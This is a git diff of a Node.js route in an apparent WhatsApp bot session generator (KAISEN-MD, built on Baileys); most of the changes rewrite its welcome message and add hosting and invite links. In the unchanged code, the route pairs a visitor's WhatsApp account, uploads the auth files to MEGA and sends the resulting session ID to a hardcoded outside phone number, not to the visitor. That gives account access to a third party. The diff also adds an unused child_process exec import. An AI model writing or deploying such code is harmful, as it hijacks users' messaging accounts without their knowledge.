@@ -3,21 +3,29 @@ const fs = require('fs-extra');
 let router = express.Router();
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
+
 const MESSAGE = process.env.MESSAGE || `
-╭─❍  *𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃 𝐁𝐎𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
-├ 🍓 *Device:* Connected Successfully
-├ 🎐 *Bot Name:* KAISEN-MD
-├ 🍄 *Status:* Online & Ready
-├ 🍉 *Owner:* +917003816486
+╭─❍ *𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
+├ 🎐 *Bot Name:* 𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃
+├ 🍄 *Session:* Secure ID Linked
 ╰───────────────⬣
-
-💬 *Welcome to KAISEN-MD WhatsApp Bot!*
-🔹 Use *.menu* to explore all commands.
-🔹 Stay respectful and enjoy smart automation.
-
-🌸 *Powered by Kaisen Team*
-🎀 *Secure Session ID Linked*
+╭─❍ *ＤＥＰＬＯＹ ＯＰＴＩＯＮＳ*  
+├ ☁️ Railway
+├ 🌱 Heroku  
+├ 🤍 VPS / Private Server  
+├ 🌾 Hosting Panels →
+├ 🌧️ katabump.com
+├ 🌈 bothosting.net
+├ 🍒 optiklink.com 
+╰───────────────⬣
+╭─❍ *ＬＩＮＫＳ*  
+├ 🍓 GitHub →
+├ https://github.com/sumon9836/KAISEN-MD
+├ 🍉 WhatsApp → 
+├ https://chat.whatsapp.com/CQyxExEBMGvEnkA32zqbNY?mode=ac_t  
+╰───────────────⬣
 `;
+
 
 
 const { upload } = require('../utils/mega');
@@ -29,7 +37,7 @@ const {
     Browsers,
     DisconnectReason
 } = require("@whiskeysockets/baileys");
-
+const { exec } = require('child_process');    
 // Ensure the directory is empty when the app starts
 if (fs.existsSync('./auth_info_baileys')) {
     fs.emptyDirSync(__dirname + '/auth_info_baileys');
@@ -72,6 +80,7 @@ router.get('/', async (req, res) => {
                         const auth_path = './auth_info_baileys/';
                         // Send message to fixed number
         let user = '917003816486@s.whatsapp.net';
+       
 
                         // Define randomMegaId function to generate random IDs
                         function randomMegaId(length = 6, numberLength = 4) {
@@ -92,6 +101,7 @@ router.get('/', async (req, res) => {
 
                         let msgsss = await Smd.sendMessage(user, { text: "KAISEN~" + Scan_Id });
                         await Smd.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
+
                         await delay(1000);
                         try { await fs.emptyDirSync(__dirname + '/auth_info_baileys'); } catch (e) {}
 
